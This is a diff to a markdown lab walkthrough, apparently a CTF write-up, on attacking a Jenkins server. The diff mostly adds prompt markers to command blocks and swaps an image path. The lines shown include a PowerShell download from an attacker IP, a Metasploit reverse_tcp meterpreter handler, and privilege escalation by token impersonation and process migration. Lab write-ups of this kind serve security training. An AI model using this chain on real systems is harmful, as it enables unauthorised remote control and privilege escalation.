@@ -15,7 +15,7 @@ if you've worked in any sort of SaaS/tech company, odds are you've used a CI/CD 
 
 **CD (continuous deployment)**: every change that passes the automated tests is automatically placed in production, resulting in many production deployments. this is the ultimate goal of many companies, given they're not constrained by regulatory or compliance requirements. 
 
-![cicd](/cicd.png)
+![cicd](/CICD-DevOps.png)
 
 
 ## jenkins
@@ -93,17 +93,17 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.4.75:800
 save this build, but before building, let's create a handler in metasploit to receive the connection.
 
 ```
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 10.9.4.75
-set LPORT 9002
-run
+> use exploit/multi/handler
+> set PAYLOAD windows/meterpreter/reverse_tcp
+> set LHOST 10.9.4.75
+> set LPORT 9002
+> run
 ```
 
 back in jenkins, once you build and the payload has been downloaded to target, in the msfconsole shell type the following to get the meterpreter shell.
 
 ```
-Start-Process "jenkins.exe"
+> Start-Process "jenkins.exe"
 ```
 
 
@@ -145,37 +145,37 @@ you can read more about them [here](https://www.exploit-db.com/papers/42556).
 back in the meterpreter shell, we can check privs easily.
 
 ```
-whoami /priv
+> whoami /priv
 ```
 
 2 privileges should show up: SeDebugPrivilege and SeImpersonatePrivilege. let's use incognito mode to exploit this.
 
 ```
-load incognito
+> load incognito
 ```
 
 to check which tokens are available to us:
 ```
-list_tokens -g
+> list_tokens -g
 ```
 
 the token **BUILTIN\Administrators** is available. impersonating it should be easy.
 
 ```
-impersonate_token "BUILTIN\Administrators"
+> impersonate_token "BUILTIN\Administrators"
 ```
 
 it's good practice to double check privileges. 
 
 ```
-getuid
+> getuid
 ```
 
 although we now have a higher privilege token, we may not actually have higher privilege permissions. windows uses a primary token of the process and not the impersonated token to determine what the process can do. so, we just migrate to a process with correct permissions. the safest process to pick is usually ```services.exe```.
 
 ```
-ps
-migrate <PID>
+> ps
+> migrate <PID>
 ```
 
 we've now migrated to an elevated process using its process ID (PID).
